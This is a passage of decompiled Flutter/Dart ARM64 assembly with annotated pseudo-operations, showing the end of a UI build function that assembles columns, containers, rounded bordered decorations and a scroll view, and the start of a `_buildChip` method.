    //     0x877470: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3be40] Obj!Text@a30001
    //     0x877474: ldr             x16, [x16, #0xe40]
    // 0x877478: StoreField: r0->field_f = r16
    //     0x877478: stur            w16, [x0, #0xf]
    // 0x87747c: r16 = Instance_SizedBox
    //     0x87747c: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x877480: ldr             x16, [x16, #0x50]
    // 0x877484: StoreField: r0->field_13 = r16
    //     0x877484: stur            w16, [x0, #0x13]
    // 0x877488: ldur            x1, [fp, #-0x38]
    // 0x87748c: ArrayStore: r0[0] = r1  ; List_4
    //     0x87748c: stur            w1, [x0, #0x17]
    // 0x877490: r16 = Instance_SizedBox
    //     0x877490: add             x16, PP, #0x12, lsl #12  ; [pp+0x12050] Obj!SizedBox@a3a801
    //     0x877494: ldr             x16, [x16, #0x50]
    // 0x877498: StoreField: r0->field_1b = r16
    //     0x877498: stur            w16, [x0, #0x1b]
    // 0x87749c: ldur            x1, [fp, #-0x20]
    // 0x8774a0: StoreField: r0->field_1f = r1
    //     0x8774a0: stur            w1, [x0, #0x1f]
    // 0x8774a4: r1 = <Widget>
    //     0x8774a4: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x8774a8: r0 = AllocateGrowableArray()
    //     0x8774a8: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x8774ac: mov             x1, x0
    // 0x8774b0: ldur            x0, [fp, #-0x10]
    // 0x8774b4: stur            x1, [fp, #-0x20]
    // 0x8774b8: StoreField: r1->field_f = r0
    //     0x8774b8: stur            w0, [x1, #0xf]
    // 0x8774bc: r0 = 10
    //     0x8774bc: mov             x0, #0xa
    // 0x8774c0: StoreField: r1->field_b = r0
    //     0x8774c0: stur            w0, [x1, #0xb]
    // 0x8774c4: r0 = Column()
    //     0x8774c4: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x8774c8: mov             x1, x0
    // 0x8774cc: r0 = Instance_Axis
    //     0x8774cc: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x8774d0: stur            x1, [fp, #-0x10]
    // 0x8774d4: StoreField: r1->field_f = r0
    //     0x8774d4: stur            w0, [x1, #0xf]
    // 0x8774d8: r2 = Instance_MainAxisAlignment
    //     0x8774d8: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x8774dc: StoreField: r1->field_13 = r2
    //     0x8774dc: stur            w2, [x1, #0x13]
    // 0x8774e0: r3 = Instance_MainAxisSize
    //     0x8774e0: add             x3, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x8774e4: ldr             x3, [x3, #0xbc0]
    // 0x8774e8: ArrayStore: r1[0] = r3  ; List_4
    //     0x8774e8: stur            w3, [x1, #0x17]
    // 0x8774ec: r4 = Instance_CrossAxisAlignment
    //     0x8774ec: ldr             x4, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x8774f0: StoreField: r1->field_1b = r4
    //     0x8774f0: stur            w4, [x1, #0x1b]
    // 0x8774f4: r5 = Instance_VerticalDirection
    //     0x8774f4: ldr             x5, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x8774f8: StoreField: r1->field_23 = r5
    //     0x8774f8: stur            w5, [x1, #0x23]
    // 0x8774fc: r6 = Instance_Clip
    //     0x8774fc: ldr             x6, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x877500: StoreField: r1->field_2b = r6
    //     0x877500: stur            w6, [x1, #0x2b]
    // 0x877504: StoreField: r1->field_2f = rZR
    //     0x877504: stur            xzr, [x1, #0x2f]
    // 0x877508: ldur            x7, [fp, #-0x20]
    // 0x87750c: StoreField: r1->field_b = r7
    //     0x87750c: stur            w7, [x1, #0xb]
    // 0x877510: r0 = Container()
    //     0x877510: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x877514: stur            x0, [fp, #-0x20]
    // 0x877518: r16 = Instance_EdgeInsets
    //     0x877518: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3b3b8] Obj!EdgeInsets@a08991
    //     0x87751c: ldr             x16, [x16, #0x3b8]
    // 0x877520: ldur            lr, [fp, #-0x30]
    // 0x877524: stp             lr, x16, [SP, #8]
    // 0x877528: ldur            x16, [fp, #-0x10]
    // 0x87752c: str             x16, [SP]
    // 0x877530: mov             x1, x0
    // 0x877534: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x877534: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x877538: ldr             x4, [x4, #0xe58]
    // 0x87753c: r0 = Container()
    //     0x87753c: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x877540: ldur            x0, [fp, #-8]
    // 0x877544: LoadField: r1 = r0->field_b
    //     0x877544: ldur            w1, [x0, #0xb]
    // 0x877548: LoadField: r2 = r0->field_f
    //     0x877548: ldur            w2, [x0, #0xf]
    // 0x87754c: DecompressPointer r2
    //     0x87754c: add             x2, x2, HEAP, lsl #32
    // 0x877550: LoadField: r3 = r2->field_b
    //     0x877550: ldur            w3, [x2, #0xb]
    // 0x877554: r2 = LoadInt32Instr(r1)
    //     0x877554: sbfx            x2, x1, #1, #0x1f
    // 0x877558: stur            x2, [fp, #-0x70]
    // 0x87755c: r1 = LoadInt32Instr(r3)
    //     0x87755c: sbfx            x1, x3, #1, #0x1f
    // 0x877560: cmp             x2, x1
    // 0x877564: b.ne            #0x877570
    // 0x877568: mov             x1, x0
    // 0x87756c: r0 = _growToNextCapacity()
    //     0x87756c: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x877570: ldur            x2, [fp, #-8]
    // 0x877574: ldur            x3, [fp, #-0x70]
    // 0x877578: add             x4, x3, #1
    // 0x87757c: lsl             x0, x4, #1
    // 0x877580: StoreField: r2->field_b = r0
    //     0x877580: stur            w0, [x2, #0xb]
    // 0x877584: LoadField: r5 = r2->field_f
    //     0x877584: ldur            w5, [x2, #0xf]
    // 0x877588: DecompressPointer r5
    //     0x877588: add             x5, x5, HEAP, lsl #32
    // 0x87758c: mov             x1, x5
    // 0x877590: ldur            x0, [fp, #-0x20]
    // 0x877594: ArrayStore: r1[r3] = r0  ; List_4
    //     0x877594: add             x25, x1, x3, lsl #2
    //     0x877598: add             x25, x25, #0xf
    //     0x87759c: str             w0, [x25]
    //     0x8775a0: tbz             w0, #0, #0x8775bc
    //     0x8775a4: ldurb           w16, [x1, #-1]
    //     0x8775a8: ldurb           w17, [x0, #-1]
    //     0x8775ac: and             x16, x17, x16, lsr #2
    //     0x8775b0: tst             x16, HEAP, lsr #32
    //     0x8775b4: b.eq            #0x8775bc
    //     0x8775b8: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x8775bc: mov             x3, x4
    // 0x8775c0: mov             x0, x5
    // 0x8775c4: b               #0x8775d0
    // 0x8775c8: mov             x2, x1
    // 0x8775cc: r3 = 8
    //     0x8775cc: mov             x3, #8
    // 0x8775d0: stur            x3, [fp, #-0x70]
    // 0x8775d4: LoadField: r1 = r0->field_b
    //     0x8775d4: ldur            w1, [x0, #0xb]
    // 0x8775d8: r0 = LoadInt32Instr(r1)
    //     0x8775d8: sbfx            x0, x1, #1, #0x1f
    // 0x8775dc: cmp             x3, x0
    // 0x8775e0: b.ne            #0x8775ec
    // 0x8775e4: mov             x1, x2
    // 0x8775e8: r0 = _growToNextCapacity()
    //     0x8775e8: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x8775ec: ldur            x2, [fp, #-8]
    // 0x8775f0: ldur            x3, [fp, #-0x70]
    // 0x8775f4: add             x0, x3, #1
    // 0x8775f8: lsl             x1, x0, #1
    // 0x8775fc: StoreField: r2->field_b = r1
    //     0x8775fc: stur            w1, [x2, #0xb]
    // 0x877600: mov             x1, x3
    // 0x877604: cmp             x1, x0
    // 0x877608: b.hs            #0x8778c4
    // 0x87760c: LoadField: r0 = r2->field_f
    //     0x87760c: ldur            w0, [x2, #0xf]
    // 0x877610: DecompressPointer r0
    //     0x877610: add             x0, x0, HEAP, lsl #32
    // 0x877614: add             x1, x0, x3, lsl #2
    // 0x877618: r16 = Instance_SizedBox
    //     0x877618: add             x16, PP, #0x11, lsl #12  ; [pp+0x115b0] Obj!SizedBox@a3a7e1
    //     0x87761c: ldr             x16, [x16, #0x5b0]
    // 0x877620: StoreField: r1->field_f = r16
    //     0x877620: stur            w16, [x1, #0xf]
    // 0x877624: r0 = Color()
    //     0x877624: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x877628: mov             x1, x0
    // 0x87762c: r0 = Instance_ColorSpace
    //     0x87762c: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x877630: StoreField: r1->field_27 = r0
    //     0x877630: stur            w0, [x1, #0x27]
    // 0x877634: d1 = 0.760784
    //     0x877634: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x877638: ldr             d1, [x17, #0xc40]
    // 0x87763c: StoreField: r1->field_7 = d1
    //     0x87763c: stur            d1, [x1, #7]
    // 0x877640: d2 = 0.956863
    //     0x877640: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x877644: ldr             d2, [x17, #0xec8]
    // 0x877648: StoreField: r1->field_f = d2
    //     0x877648: stur            d2, [x1, #0xf]
    // 0x87764c: ArrayStore: r1[0] = d2  ; List_8
    //     0x87764c: stur            d2, [x1, #0x17]
    // 0x877650: StoreField: r1->field_1f = d2
    //     0x877650: stur            d2, [x1, #0x1f]
    // 0x877654: d0 = 0.100000
    //     0x877654: add             x17, PP, #0xc, lsl #12  ; [pp+0xc100] IMM: double(0.1) from 0x3fb999999999999a
    //     0x877658: ldr             d0, [x17, #0x100]
    // 0x87765c: r0 = withOpacity()
    //     0x87765c: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x877660: stur            x0, [fp, #-0x10]
    // 0x877664: r0 = Radius()
    //     0x877664: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x877668: d0 = 15.000000
    //     0x877668: fmov            d0, #15.00000000
    // 0x87766c: stur            x0, [fp, #-0x18]
    // 0x877670: StoreField: r0->field_7 = d0
    //     0x877670: stur            d0, [x0, #7]
    // 0x877674: StoreField: r0->field_f = d0
    //     0x877674: stur            d0, [x0, #0xf]
    // 0x877678: r0 = BorderRadius()
    //     0x877678: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x87767c: mov             x1, x0
    // 0x877680: ldur            x0, [fp, #-0x18]
    // 0x877684: stur            x1, [fp, #-0x20]
    // 0x877688: StoreField: r1->field_7 = r0
    //     0x877688: stur            w0, [x1, #7]
    // 0x87768c: StoreField: r1->field_b = r0
    //     0x87768c: stur            w0, [x1, #0xb]
    // 0x877690: StoreField: r1->field_f = r0
    //     0x877690: stur            w0, [x1, #0xf]
    // 0x877694: StoreField: r1->field_13 = r0
    //     0x877694: stur            w0, [x1, #0x13]
    // 0x877698: r0 = Color()
    //     0x877698: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x87769c: mov             x1, x0
    // 0x8776a0: r0 = Instance_ColorSpace
    //     0x8776a0: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8776a4: StoreField: r1->field_27 = r0
    //     0x8776a4: stur            w0, [x1, #0x27]
    // 0x8776a8: d0 = 0.760784
    //     0x8776a8: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x8776ac: ldr             d0, [x17, #0xc40]
    // 0x8776b0: StoreField: r1->field_7 = d0
    //     0x8776b0: stur            d0, [x1, #7]
    // 0x8776b4: d0 = 0.956863
    //     0x8776b4: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x8776b8: ldr             d0, [x17, #0xec8]
    // 0x8776bc: StoreField: r1->field_f = d0
    //     0x8776bc: stur            d0, [x1, #0xf]
    // 0x8776c0: ArrayStore: r1[0] = d0  ; List_8
    //     0x8776c0: stur            d0, [x1, #0x17]
    // 0x8776c4: StoreField: r1->field_1f = d0
    //     0x8776c4: stur            d0, [x1, #0x1f]
    // 0x8776c8: d0 = 0.300000
    //     0x8776c8: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x8776cc: ldr             d0, [x17, #0x180]
    // 0x8776d0: r0 = withOpacity()
    //     0x8776d0: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x8776d4: str             x0, [SP]
    // 0x8776d8: r1 = Null
    //     0x8776d8: mov             x1, NULL
    // 0x8776dc: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x8776dc: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x8776e0: ldr             x4, [x4, #0xc68]
    // 0x8776e4: r0 = Border.all()
    //     0x8776e4: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x8776e8: stur            x0, [fp, #-0x18]
    // 0x8776ec: r0 = BoxDecoration()
    //     0x8776ec: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x8776f0: mov             x1, x0
    // 0x8776f4: ldur            x0, [fp, #-0x10]
    // 0x8776f8: stur            x1, [fp, #-0x28]
    // 0x8776fc: StoreField: r1->field_7 = r0
    //     0x8776fc: stur            w0, [x1, #7]
    // 0x877700: ldur            x0, [fp, #-0x18]
    // 0x877704: StoreField: r1->field_f = r0
    //     0x877704: stur            w0, [x1, #0xf]
    // 0x877708: ldur            x0, [fp, #-0x20]
    // 0x87770c: StoreField: r1->field_13 = r0
    //     0x87770c: stur            w0, [x1, #0x13]
    // 0x877710: r0 = Instance_BoxShape
    //     0x877710: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x877714: ldr             x0, [x0, #0xd78]
    // 0x877718: StoreField: r1->field_23 = r0
    //     0x877718: stur            w0, [x1, #0x23]
    // 0x87771c: r0 = Container()
    //     0x87771c: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x877720: stur            x0, [fp, #-0x10]
    // 0x877724: r16 = Instance_EdgeInsets
    //     0x877724: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3b3b8] Obj!EdgeInsets@a08991
    //     0x877728: ldr             x16, [x16, #0x3b8]
    // 0x87772c: ldur            lr, [fp, #-0x28]
    // 0x877730: stp             lr, x16, [SP, #8]
    // 0x877734: r16 = Instance_Column
    //     0x877734: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3be48] Obj!Column@a3bda1
    //     0x877738: ldr             x16, [x16, #0xe48]
    // 0x87773c: str             x16, [SP]
    // 0x877740: mov             x1, x0
    // 0x877744: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x877744: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x877748: ldr             x4, [x4, #0xe58]
    // 0x87774c: r0 = Container()
    //     0x87774c: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x877750: ldur            x0, [fp, #-8]
    // 0x877754: LoadField: r1 = r0->field_b
    //     0x877754: ldur            w1, [x0, #0xb]
    // 0x877758: LoadField: r2 = r0->field_f
    //     0x877758: ldur            w2, [x0, #0xf]
    // 0x87775c: DecompressPointer r2
    //     0x87775c: add             x2, x2, HEAP, lsl #32
    // 0x877760: LoadField: r3 = r2->field_b
    //     0x877760: ldur            w3, [x2, #0xb]
    // 0x877764: r2 = LoadInt32Instr(r1)
    //     0x877764: sbfx            x2, x1, #1, #0x1f
    // 0x877768: stur            x2, [fp, #-0x70]
    // 0x87776c: r1 = LoadInt32Instr(r3)
    //     0x87776c: sbfx            x1, x3, #1, #0x1f
    // 0x877770: cmp             x2, x1
    // 0x877774: b.ne            #0x877780
    // 0x877778: mov             x1, x0
    // 0x87777c: r0 = _growToNextCapacity()
    //     0x87777c: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x877780: ldur            x2, [fp, #-8]
    // 0x877784: ldur            x3, [fp, #-0x70]
    // 0x877788: add             x0, x3, #1
    // 0x87778c: lsl             x1, x0, #1
    // 0x877790: StoreField: r2->field_b = r1
    //     0x877790: stur            w1, [x2, #0xb]
    // 0x877794: LoadField: r1 = r2->field_f
    //     0x877794: ldur            w1, [x2, #0xf]
    // 0x877798: DecompressPointer r1
    //     0x877798: add             x1, x1, HEAP, lsl #32
    // 0x87779c: ldur            x0, [fp, #-0x10]
    // 0x8777a0: ArrayStore: r1[r3] = r0  ; List_4
    //     0x8777a0: add             x25, x1, x3, lsl #2
    //     0x8777a4: add             x25, x25, #0xf
    //     0x8777a8: str             w0, [x25]
    //     0x8777ac: tbz             w0, #0, #0x8777c8
    //     0x8777b0: ldurb           w16, [x1, #-1]
    //     0x8777b4: ldurb           w17, [x0, #-1]
    //     0x8777b8: and             x16, x17, x16, lsr #2
    //     0x8777bc: tst             x16, HEAP, lsr #32
    //     0x8777c0: b.eq            #0x8777c8
    //     0x8777c4: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x8777c8: r0 = Column()
    //     0x8777c8: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x8777cc: mov             x1, x0
    // 0x8777d0: r0 = Instance_Axis
    //     0x8777d0: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x8777d4: stur            x1, [fp, #-0x10]
    // 0x8777d8: StoreField: r1->field_f = r0
    //     0x8777d8: stur            w0, [x1, #0xf]
    // 0x8777dc: r2 = Instance_MainAxisAlignment
    //     0x8777dc: ldr             x2, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x8777e0: StoreField: r1->field_13 = r2
    //     0x8777e0: stur            w2, [x1, #0x13]
    // 0x8777e4: r2 = Instance_MainAxisSize
    //     0x8777e4: add             x2, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x8777e8: ldr             x2, [x2, #0xbc0]
    // 0x8777ec: ArrayStore: r1[0] = r2  ; List_4
    //     0x8777ec: stur            w2, [x1, #0x17]
    // 0x8777f0: r2 = Instance_CrossAxisAlignment
    //     0x8777f0: ldr             x2, [PP, #0x6f88]  ; [pp+0x6f88] Obj!CrossAxisAlignment@a402c1
    // 0x8777f4: StoreField: r1->field_1b = r2
    //     0x8777f4: stur            w2, [x1, #0x1b]
    // 0x8777f8: r2 = Instance_VerticalDirection
    //     0x8777f8: ldr             x2, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x8777fc: StoreField: r1->field_23 = r2
    //     0x8777fc: stur            w2, [x1, #0x23]
    // 0x877800: r2 = Instance_Clip
    //     0x877800: ldr             x2, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x877804: StoreField: r1->field_2b = r2
    //     0x877804: stur            w2, [x1, #0x2b]
    // 0x877808: StoreField: r1->field_2f = rZR
    //     0x877808: stur            xzr, [x1, #0x2f]
    // 0x87780c: ldur            x2, [fp, #-8]
    // 0x877810: StoreField: r1->field_b = r2
    //     0x877810: stur            w2, [x1, #0xb]
    // 0x877814: r0 = SingleChildScrollView()
    //     0x877814: bl              #0x6aa334  ; AllocateSingleChildScrollViewStub -> SingleChildScrollView (size=0x3c)
    // 0x877818: r1 = Instance_Axis
    //     0x877818: ldr             x1, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x87781c: StoreField: r0->field_b = r1
    //     0x87781c: stur            w1, [x0, #0xb]
    // 0x877820: r1 = false
    //     0x877820: add             x1, NULL, #0x30  ; false
    // 0x877824: StoreField: r0->field_f = r1
    //     0x877824: stur            w1, [x0, #0xf]
    // 0x877828: r1 = Instance_EdgeInsets
    //     0x877828: add             x1, PP, #0x11, lsl #12  ; [pp+0x11e18] Obj!EdgeInsets@a06141
    //     0x87782c: ldr             x1, [x1, #0xe18]
    // 0x877830: StoreField: r0->field_13 = r1
    //     0x877830: stur            w1, [x0, #0x13]
    // 0x877834: ldur            x1, [fp, #-0x10]
    // 0x877838: StoreField: r0->field_23 = r1
    //     0x877838: stur            w1, [x0, #0x23]
    // 0x87783c: r1 = Instance_DragStartBehavior
    //     0x87783c: ldr             x1, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x877840: StoreField: r0->field_27 = r1
    //     0x877840: stur            w1, [x0, #0x27]
    // 0x877844: r1 = Instance_Clip
    //     0x877844: add             x1, PP, #0xc, lsl #12  ; [pp+0xca18] Obj!Clip@a43d61
    //     0x877848: ldr             x1, [x1, #0xa18]
    // 0x87784c: StoreField: r0->field_2b = r1
    //     0x87784c: stur            w1, [x0, #0x2b]
    // 0x877850: r1 = Instance_HitTestBehavior
    //     0x877850: add             x1, PP, #0xc, lsl #12  ; [pp+0xcc18] Obj!HitTestBehavior@a40181
    //     0x877854: ldr             x1, [x1, #0xc18]
    // 0x877858: StoreField: r0->field_2f = r1
    //     0x877858: stur            w1, [x0, #0x2f]
    // 0x87785c: LeaveFrame
    //     0x87785c: mov             SP, fp
    //     0x877860: ldp             fp, lr, [SP], #0x10
    // 0x877864: ret
    //     0x877864: ret             
    // 0x877868: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877868: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87786c: b               #0x8761f4
    // 0x877870: add             x4, x4, x2
    // 0x877874: b               #0x8772a0
    // 0x877878: stp             q1, q2, [SP, #-0x20]!
    // 0x87787c: SaveReg d0
    //     0x87787c: str             q0, [SP, #-0x10]!
    // 0x877880: stp             x0, x1, [SP, #-0x10]!
    // 0x877884: r0 = AllocateDouble()
    //     0x877884: bl              #0xbf7b18  ; AllocateDoubleStub
    // 0x877888: mov             x2, x0
    // 0x87788c: ldp             x0, x1, [SP], #0x10
    // 0x877890: RestoreReg d0
    //     0x877890: ldr             q0, [SP], #0x10
    // 0x877894: ldp             q1, q2, [SP], #0x20
    // 0x877898: b               #0x877354
    // 0x87789c: SaveReg d1
    //     0x87789c: str             q1, [SP, #-0x10]!
    // 0x8778a0: stp             x2, x3, [SP, #-0x10]!
    // 0x8778a4: d0 = 0.000000
    //     0x8778a4: fmov            d0, d1
    // 0x8778a8: r0 = 76
    //     0x8778a8: mov             x0, #0x4c
    // 0x8778ac: r30 = DoubleToIntegerStub
    //     0x8778ac: ldr             lr, [PP, #0x1590]  ; [pp+0x1590] Stub: DoubleToInteger (0x451890)
    // 0x8778b0: LoadField: r30 = r30->field_7
    //     0x8778b0: ldur            lr, [lr, #7]
    // 0x8778b4: blr             lr
    // 0x8778b8: ldp             x2, x3, [SP], #0x10
    // 0x8778bc: RestoreReg d1
    //     0x8778bc: ldr             q1, [SP], #0x10
    // 0x8778c0: b               #0x877408
    // 0x8778c4: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x8778c4: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
  }
  _ _buildChip(/* No info */) {
    // ** addr: 0x8778c8, size: 0x158
    // 0x8778c8: EnterFrame
    //     0x8778c8: stp             fp, lr, [SP, #-0x10]!
    //     0x8778cc: mov             fp, SP
    // 0x8778d0: AllocStack(0x48)
    //     0x8778d0: sub             SP, SP, #0x48
    // 0x8778d4: SetupParameters(dynamic _ /* r2 => r2, fp-0x8 */, dynamic _ /* r3 => r0, fp-0x10 */)
    //     0x8778d4: mov             x0, x3
    //     0x8778d8: stur            x2, [fp, #-8]
    //     0x8778dc: stur            x3, [fp, #-0x10]
    // 0x8778e0: CheckStackOverflow
    //     0x8778e0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8778e4: cmp             SP, x16
    //     0x8778e8: b.ls            #0x877a18
    // 0x8778ec: mov             x1, x0
    // 0x8778f0: d0 = 0.200000
    //     0x8778f0: add             x17, PP, #0xc, lsl #12  ; [pp+0xc150] IMM: double(0.2) from 0x3fc999999999999a
    //     0x8778f4: ldr             d0, [x17, #0x150]
    // 0x8778f8: r0 = withOpacity()
    //     0x8778f8: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x8778fc: stur            x0, [fp, #-0x18]
    // 0x877900: r0 = Radius()
    //     0x877900: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x877904: d0 = 20.000000
    //     0x877904: fmov            d0, #20.00000000
    // 0x877908: stur            x0, [fp, #-0x20]
    // 0x87790c: StoreField: r0->field_7 = d0
    //     0x87790c: stur            d0, [x0, #7]
    // 0x877910: StoreField: r0->field_f = d0
    //     0x877910: stur            d0, [x0, #0xf]
    // 0x877914: r0 = BorderRadius()
    //     0x877914: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x877918: mov             x2, x0
    // 0x87791c: ldur            x0, [fp, #-0x20]
    // 0x877920: stur            x2, [fp, #-0x28]
    // 0x877924: StoreField: r2->field_7 = r0
    //     0x877924: stur            w0, [x2, #7]
    // 0x877928: StoreField: r2->field_b = r0
    //     0x877928: stur            w0, [x2, #0xb]
    // 0x87792c: StoreField: r2->field_f = r0
    //     0x87792c: stur            w0, [x2, #0xf]
    // 0x877930: StoreField: r2->field_13 = r0
    //     0x877930: stur            w0, [x2, #0x13]
    // 0x877934: ldur            x1, [fp, #-0x10]
    // 0x877938: d0 = 0.500000
    //     0x877938: fmov            d0, #0.50000000
    // 0x87793c: r0 = withOpacity()
    //     0x87793c: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x877940: str             x0, [SP]
    // 0x877944: r1 = Null
    //     0x877944: mov             x1, NULL
    // 0x877948: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x877948: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x87794c: ldr             x4, [x4, #0xc68]
    // 0x877950: r0 = Border.all()
    //     0x877950: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x877954: stur            x0, [fp, #-0x20]
    // 0x877958: r0 = BoxDecoration()
    //     0x877958: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x87795c: mov             x1, x0
    // 0x877960: ldur            x0, [fp, #-0x18]
    // 0x877964: stur            x1, [fp, #-0x30]
    // 0x877968: StoreField: r1->field_7 = r0
    //     0x877968: stur            w0, [x1, #7]
    // 0x87796c: ldur            x0, [fp, #-0x20]
    // 0x877970: StoreField: r1->field_f = r0
    //     0x877970: stur            w0, [x1, #0xf]
    // 0x877974: ldur            x0, [fp, #-0x28]
    // 0x877978: StoreField: r1->field_13 = r0
    //     0x877978: stur            w0, [x1, #0x13]
    // 0x87797c: r0 = Instance_BoxShape
    //     0x87797c: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x877980: ldr             x0, [x0, #0xd78]
    // 0x877984: StoreField: r1->field_23 = r0
    //     0x877984: stur            w0, [x1, #0x23]
    // 0x877988: r0 = TextStyle()
    //     0x877988: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x87798c: mov             x1, x0
    // 0x877990: r0 = true
    //     0x877990: add             x0, NULL, #0x20  ; true
    // 0x877994: stur            x1, [fp, #-0x18]
    // 0x877998: StoreField: r1->field_7 = r0
    //     0x877998: stur            w0, [x1, #7]
    // 0x87799c: ldur            x0, [fp, #-0x10]
    // 0x8779a0: StoreField: r1->field_b = r0
    //     0x8779a0: stur            w0, [x1, #0xb]
    // 0x8779a4: r0 = 10.000000
    //     0x8779a4: add             x0, PP, #0xc, lsl #12  ; [pp+0xc778] 10
    //     0x8779a8: ldr             x0, [x0, #0x778]
    // 0x8779ac: StoreField: r1->field_1f = r0
    //     0x8779ac: stur            w0, [x1, #0x1f]
    // 0x8779b0: r0 = Instance_FontWeight
    //     0x8779b0: add             x0, PP, #0x14, lsl #12  ; [pp+0x14568] Obj!FontWeight@a0c491
    //     0x8779b4: ldr             x0, [x0, #0x568]
    // 0x8779b8: StoreField: r1->field_23 = r0
    //     0x8779b8: stur            w0, [x1, #0x23]
    // 0x8779bc: r0 = Text()
    //     0x8779bc: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x8779c0: mov             x1, x0
    // 0x8779c4: ldur            x0, [fp, #-8]
    // 0x8779c8: stur            x1, [fp, #-0x10]
    // 0x8779cc: StoreField: r1->field_b = r0
    //     0x8779cc: stur            w0, [x1, #0xb]
    // 0x8779d0: ldur            x0, [fp, #-0x18]
    // 0x8779d4: StoreField: r1->field_13 = r0
    //     0x8779d4: stur            w0, [x1, #0x13]
